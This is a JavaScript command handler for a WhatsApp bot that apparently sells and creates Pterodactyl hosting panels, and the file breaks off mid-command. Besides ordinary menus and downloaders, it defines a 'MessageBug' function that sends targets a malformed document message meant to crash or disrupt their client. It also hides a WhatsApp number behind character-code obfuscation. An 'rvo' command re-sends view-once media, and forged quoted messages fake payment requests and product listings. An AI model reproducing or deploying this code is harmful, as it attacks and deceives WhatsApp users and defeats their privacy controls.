/*
#RexxaDev
youtube : https://youtube.com/@rexxadev
buy no enc : https://wa.me/6287823358993
*/

module.exports = async (Xrzteam, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
let crypto = require('crypto')
const makeid = crypto.randomBytes(3).toString('hex')
const { Client } = require('ssh2');
const quoted = m.quoted ? m.quoted : m
const from = m.key.remoteJid
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const buffer64base = String.fromCharCode(54, 50, 56, 55, 56, 50, 51, 51, 53, 56, 57, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const botNumber = await Xrzteam.decodeJid(Xrzteam.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Xrzteam.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
let participant_sender = isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { version } = require("./package.json")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const { Scraper } = require("akiraa-wb");
const Skrep = new Scraper()
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
const plerr = JSON.parse(fs.readFileSync('./all/database/idgrup2.json').toString())
const jangan2 = m.isGroup ? plerr.includes(m.chat) : false
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))

const isPremium = prem.includes(m.sender)
const { BingImageCreator } = require("./all/bingimg.js");


if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

const MessageBug = async (target) => {
return Xrzteam.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Dokumen Negara.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
}

let ppuser
try {
ppuser = await Xrzteam.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://img100.pixhost.to/images/659/539914030_rexxaoffc.jpg'
}

async function XrzteamReply(teks) {
return Xrzteam.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, title: "｢ ACCESS DENIED ｣", body: "© Powered By RexxaDev", previewType: "PHOTO"}}}, {quoted: m})
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: namabot
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By ${namaowner}`,
inviteExpiration: Date.now() + 1814400000
}
}}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${namaowner}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By RexxaDev`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${namaowner}`, jpegThumbnail: ""}}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const qloc = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": 'イ Created By RexxaDev',
                    "jpegThumbnail": ''
                          }
                        }
                      }


let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

Xrzteam.autoshalat = Xrzteam.autoshalat ? Xrzteam.autoshalat : {}
    let ats = m.chat
    if (ats in Xrzteam.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:03',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '11:39',
    ashar: '15:03',
    magrib: '17:52',
    isya: '19:05',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        Xrzteam.autoshalat[ats] = [
            Xrzteam.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mpeg',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./all/shalat.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete Xrzteam.autoshalat[m.chat]
            }, 57000)
        ]
    }
  }
  
async function reply(teks) {
            Xrzteam.sendMessage(m.chat, { 
                text: teks,
                contextInfo: {
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        isForwarded: true,
                        containsAutoReply: true,
                        title: `RexxaDev イ Cpanel`,
                        body: ``,
                        previewType: "VIDEO",
                        thumbnailUrl: "https://img100.pixhost.to/images/659/539914030_rexxaoffc.jpg",
                        thumbnail: ``,
                        sourceUrl: `https://youtube.com/@RexxaaOFFC`
                    }
                }
            }, { quoted: m });
        };

switch (command) {
case 'rexcz': {
const text12 = `
*HAI BEB* @${m.sender.split("@")[0]}.. 🪸

\`❏━━━『 INFO BOT 』━━━❏\`
 \`▢ Creator : RexxaDev\`
 \`▢ Bot Name : CpanelXczteam\`
 \`▢ Version : 1.0\`
 \`▢ Baileys : ^${version}\`
 \`▢ Runtime: ${runtime(process.uptime())}\`
\`❏━━━━━━━━━━━━━━━━━❏\`

> *Let me introduce myself, I am a whatsapp bot that is ready to help you, I was created by someone named rexxaoffc* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏


\`— panel menu\`
* ${prefix}panel
* ${prefix}listsrv
* ${prefix}delsrv
* ${prefix}listusr
* ${prefix}delusr
* ${prefix}delpanel
* ${prefix}listadmin
* ${prefix}cadmin

\`— panel menu-v2\`
* ${prefix}panel-v2
* ${prefix}listsrv-v2
* ${prefix}delsrv-v2
* ${prefix}listusr-v2
* ${prefix}delusr-v2
* ${prefix}delpanel-v2
* ${prefix}listadmin-v2
* ${prefix}cadmin-v2

\`— owner menu\`
* ${prefix}hackbackpanel
* ${prefix}listproduk
* ${prefix}public
* ${prefix}self
* ${prefix}kick
* ${prefix}hidetag
* ${prefix}tagall
* ${prefix}addprem
* ${prefix}delprem
* ${prefix}addgc

\`— other menu\`
* ${prefix}tiktok
* ${prefix}play
* ${prefix}tourl
* ${prefix}remini
* ${prefix}rvo
* ${prefix}boost
* ${prefix}done
* ${prefix}nope

*Xczteam (Cpanel)* is a Whatsapp bot created to help you create panels easily. I was created by *RexxaDev*
`
         await Xrzteam.sendMessage(m.chat, {  
            image: { url: "https://img100.pixhost.to/images/841/542218996_rexxaoffc.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "RexxaOFFC [ Testimoni ]",
                    newsletterJid: `120363315518781728@newsletter` 
                },
                isForwarded: false,
               externalAdReply: {
                   showAdAttribution: false,
                   title: `Rexxa イ Cpanel`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://img100.pixhost.to/images/659/539914030_rexxaoffc.jpg',
                   sourceUrl: `https://whatsapp.com/channel/0029VatgapSK0IBdrpiZly0q`
                }
            }
        },{ quoted: qloc }
     ),
       await Xrzteam.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/ph0dbw.m4a' },
           mimetype: 'audio/mp4', 
           ptt: false 
       },{ quoted: qloc }
     );
}
 break;
        
case 'menu': {
const text12 = `
_ʜᴀʟᴏ ᴋᴀᴋ. sᴀʏᴀ ᴀᴅᴀʟᴀʜ *\`ʀᴇxᴄᴢ\`* ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ᴏᴛᴏᴍᴀᴛɪs ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴇʟᴀᴋᴜᴋᴀɴ sᴇsᴜᴀᴛᴜ,  ᴍᴇɴᴄᴀʀɪ ᴅᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴅᴀᴛᴀ ᴀᴛᴀᴜ ɪɴғᴏʀᴍᴀsɪ ᴍᴇʟᴀʟᴜɪ ᴡʜᴀᴛsᴀᴘᴘ_
	
ᴋᴇᴛɪᴋ *.ʀᴇxᴄᴢ* \`ᴜɴᴛᴜᴋ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜱᴇᴍᴜᴀ ꜰɪᴛᴜʀ\`
ᴋᴇᴛɪᴋ *.ᴘᴀɴᴇʟᴍᴇɴᴜ* \`ᴜɴᴛᴜᴋ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ\`
ᴋᴇᴛɪᴋ *.ᴘᴀɴᴇʟᴍᴇɴᴜ-v2* \`ᴜɴᴛᴜᴋ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ2\`
ᴋᴇᴛɪᴋ *.ᴏᴛʜᴇʀᴍᴇɴᴜ* \`ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴍᴇɴᴜ ᴏᴛʜᴇʀ\`
ᴋᴇᴛɪᴋ *.ᴏᴡɴᴇʀ* \`ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ ꜱᴇꜱᴜᴀᴛᴜ\`

\`1. ᴅɪ ʟᴀʀᴀɴɢ ꜱᴘᴀᴍ ʙᴏᴛ\`
\`2. ᴅɪ ʟᴀʀᴀɴɢ ᴍᴇɴᴇʟᴘᴏɴ ʙᴏᴛ\`
\`3. ᴅɪ ʟᴀʀᴀɴɢ ᴍᴇɴᴇʟᴘᴏɴ ɴᴏ ᴏᴡɴᴇʀ\`
\`4. ᴅɪ ʟᴀʀᴀɴɢ ꜱᴘᴀᴍ ᴋᴇ ɴᴏ ᴏᴡɴᴇʀ\`
\`5. ᴅɪ ʟᴀʀᴀɴɢ ᴄᴏʟɪ.\`

\`\`\`© rexxaoffc 2023 - 2024\`\`\`
`
reply(text12)
}  
break;

case 'panelmenu':{
const text12 = `
\`— panel menu\`
* ${prefix}panel
* ${prefix}listsrv
* ${prefix}delsrv
* ${prefix}listusr
* ${prefix}delusr
* ${prefix}delpanel
* ${prefix}listadmin
* ${prefix}cadmin

> Developed By RexxaDev
`
reply(text12)
}  
break;

case 'panelmenu-v2':{
const text12 = `
\`— panel menu-v2\`
* ${prefix}panel-v2
* ${prefix}listsrv-v2
* ${prefix}delsrv-v2
* ${prefix}listusr-v2
* ${prefix}delusr-v2
* ${prefix}delpanel-v2
* ${prefix}listadmin-v2
* ${prefix}cadmin-v2

> Developed By RexxaDev
`
reply(text12)
}  
break;

case 'othermenu':{
const text12 = `
\`— other menu\`
* ${prefix}tiktok
* ${prefix}play
* ${prefix}tourl
* ${prefix}remini
* ${prefix}rvo
* ${prefix}boost
* ${prefix}done
* ${prefix}nope
> Developed By RexxaDev
`
reply(text12)
}  
break;

case 'panel':{
const text12 = `
— tutorial
* ${prefix}1gb nama,62xxx
* ${prefix}2gb nama,62xxx
* ${prefix}3gb nama,62xxx
* ${prefix}4gb nama,62xxx
* ${prefix}5gb nama,62xxx
* ${prefix}6gb nama,62xxx
* ${prefix}7gb nama,62xxx
* ${prefix}8gb nama,62xxx
* ${prefix}9gb nama,62xxx
* ${prefix}10gb nama,62xxx
* ${prefix}unli nama,62xxx

> Developed By RexxaDev
`
reply(text12)
}
break

case 'panel-v2':{
const text12 = `
— tutorial
* ${prefix}1gb-v2 nama,62xxx
* ${prefix}2gb-v2 nama,62xxx
* ${prefix}3gb-v2 nama,62xxx
* ${prefix}4gb-v2 nama,62xxx
* ${prefix}5gb-v2 nama,62xxx
* ${prefix}6gb-v2 nama,62xxx
* ${prefix}7gb-v2 nama,62xxx
* ${prefix}8gb-v2 nama,62xxx
* ${prefix}9gb-v2 nama,62xxx
* ${prefix}10gb-v2 nama,62xxx
* ${prefix}unli-v2 nama,62xxx

> Developed By RexxaDev
`
reply(text12)
}
break

case "done": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply("barang,harga\n\n*Contoh :* Panel Unlimited,2")
if (!text.split(",")) return m.reply(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"))
const [barang, harga] = text.split(",")
if (isNaN(harga)) return m.reply("Format Harga Tidak Valid")
var total = `${harga}000000`
var total2 = Number(`${harga}000`)
const msg = `━━━❏⟩ 𝗥𝗲𝘅𝘅𝗮 𝗦𝗵𝗼𝗽 ⟨❏━━━
*━━━━━━━━━━━━━━━━━━*
*ALHAMDULILLAH TRX DONE* ✅
*━━━━━━━━━━━━━━━━━━*
*[+] BARANG : ${barang}*
*[+] HARGA : Rp${toRupiah(total2)}*
*[+] WAKTU : ${tanggal(Date.now())}*
*[+] NO REAL : wa.me/6287823358993*
*[+] NO TELE REAL : t.me/rexxadev*
*[+] YT REAL : youtube.com/@RexxaaOFFC*
*[+] TT REAL : tiktok.com/@rezxgmg*
‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎  ‎⟨ 𝗔𝗟𝗟 𝗧𝗥𝗫 𝗡𝗢 𝗥𝗘𝗙𝗙 ⟩
*▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬*
𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛 𝗧𝗘𝗟𝗔𝗛 𝗢𝗥𝗗𝗘𝗥 𝗗𝗜 𝗥𝗘𝗫𝗫𝗔
𝗦𝗘𝗠𝗢𝗚𝗔 𝗦𝗨𝗞𝗔 𝗗𝗘𝗡𝗚𝗔𝗡 𝗣𝗥𝗢𝗗𝗨𝗞 𝗬𝗔𝗡𝗚
𝗞𝗔𝗠𝗜 𝗦𝗘𝗗𝗜𝗔𝗞𝗔𝗡 𝗗𝗔𝗡 𝗝𝗔𝗗𝗜 𝗟𝗔𝗡𝗚𝗚𝗔𝗡𝗔𝗡😇
`
reply(msg)
}
break          

case 'tiktok': case "tt": { 
    if (!text) return reply(`Example : ${prefix + command} link`);
    if (!text.includes('tiktok')) return reply(`Link Invalid!!`);
    reply("Please Wait..");
    
    // Menggunakan fetch untuk akses API TikTok milikmu
    fetch(`https://api.tiklydown.eu.org/api/download/v5?url=${encodeURIComponent(text)}`)
        .then(response => response.json())
        .then(data => {
            if (data.status !== 200) return reply('Gagal mengambil data dari API');
            
            // Mengambil URL video dan audio
        const title = `*Successfully*`
            const videoUrl = data.result.play;
            const audioUrl = data.result.music;
            
            // Mengirim video dan audio
            Xrzteam.sendMessage(m.chat, { caption: title, video: { url: videoUrl }}, { quoted: m });
            Xrzteam.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' }, { quoted: qloc });
        })
        .catch(err => reply(err.toString()));
}
break
        case "boost": {
            if (!isOwner) return reply(msg.owner);

            // Baca file dalam direktori session dan database sampah
            const dirsesi = fs.readdirSync("./session").filter((e) => e !== "creds.json");
            const dirsampah = fs.readdirSync("./all/tmp").filter((e) => e !== "A");

            // Hapus file session
            for (const i of dirsesi) {
                await fs.unlinkSync("./session/" + i);
            }

            // Hapus file sampah
            for (const u of dirsampah) {
                await fs.unlinkSync("./all/tmp/" + u);
            }

            // Balas pesan konfirmasi
            m.reply(`*Berhasil membersihkan sampah ✅*\n*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`);
        }
break

case "nope": {
if (!isOwner) return 
await Xrzteam.sendMessage(m.chat, {image: {url: global.qris}, caption: "\n𝗣𝗔𝗬𝗠𝗘𝗡𝗧\n› https://rexxahost.github.io/payment\n\n*JANGAN LUPA SS BUKTI TRANSAKSI YA KAK^^*\n\`~ AI REXXASTORE\`"}, {quoted: qloc})
}
break;

case "listproduk": {
if (!isOwner) return 
await Xrzteam.sendMessage(m.chat, {image: {url: global.produk}, caption: "\n*\`𝙊𝙋𝙀𝙉 𝙋𝘼𝙉𝙀𝙇 𝙋𝙏𝙀𝙍𝙊𝘿𝘼𝘾𝙏𝙔𝙇 𝙁𝙍𝙀𝙎𝙃\`*\n\n*Admin panel high quality*💠\n> Rp 12.000 / Permanen\n> Memakai vps ram 16 core 4\n> Garansi on 20 days\n> Theme acces stellar\n\n*Reseller Panel Private High Quality*🌟\n> Rp 10.000 / Permanen\n> Memakai vps ram 16 core 6\n> Garansi always on 20 days\n> Theme acces stellar\n\n*Panel private for high quality*✨\n> Ram 1gb - unlimited\n> Price : 1.000 - 9.000\n> Permanen garansi always ∞\n> Theme acces stellar\n\n*Benefit Admin panel*\n- _Anti delay_\n- _Bisa jual panel pterodactyl_\n- _Bisa open reseller_\n- _Bisa create panel sepuasnya_\n- _Free sc cpanel_\n- _Garansi on selalu_\n- _Anti ptpt_\n\n*Benefit Reseller*\n- _Anti colong sc_\n- _Bisa jual panel pterodactyl_\n- _Bisa create panel sepuasnya_\n- _Create panel via bot_\n- _Bot on 24 jam_\n- _Anti ptpt_\n- _Garansi on selalu_\n\n*\`Buy? Hubungi Owner\`*\n🗳️ Telegram : t.me/rexxadev\n💠 Testimoni : t.me/rexxaoffctesti\n🪀 Whatsapp  : wa.me/6287823358993"}, {quoted: qloc})
}
break;
        
case 'play': {
if (!text) return reply(`Example: ${prefix + command} DJ Sayang Culik Aku Dong`)
let resst = await yts(text)
let url = resst.all[0].url;
let ress = await fetch(`https://restapii.rioooxdzz.web.id/api/ytmp3?url=${url}`);
let res = await ress.json();
        await Xrzteam.sendMessage(from, { audio: {url: res.data.dl },
            mimetype: 'audio/mpeg',
            contextInfo: {
                mentionedJid: [
                    m.sender
                ],
                forwardingScore: 10,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: true,
                    title: res.data.title,
                    body: "Music",                                               thumbnailUrl: resst.all[0].thumbnail,
                    mediaType: 2,
                    renderLargerThumbnail: false,
                    mediaUrl: url,
                    sourceUrl: url,
                },
            },
        }, { quoted: qloc });
}
break

case "rvo": case "readviewonce": {
if (!quoted) return m.reply("dengan reply pesannya")
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Xrzteam.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Xrzteam.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Xrzteam.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break;
        
case 'hdr': case 'remini': {
	   	if (!quoted) return reply(`Fotonya Mana Kak ?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			reply("Proses Kak....")
			let media = await quoted.download()
			const { remini } = require('./all/remini.js')
			let proses = await remini(media, "enhance");
			Xrzteam.sendMessage(m.chat, { image: proses, caption: '🍁 Ini Hasilnya Kak...'}, { quoted: m})
			await sleep(3000)
			}
			break
			
			case "tourl": {
if (!/image/.test(mime)) return m.reply("dengan kirim/reply foto")
let media = await Xrzteam.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'rexxaoffc.png');

let teks = directLink.toString()
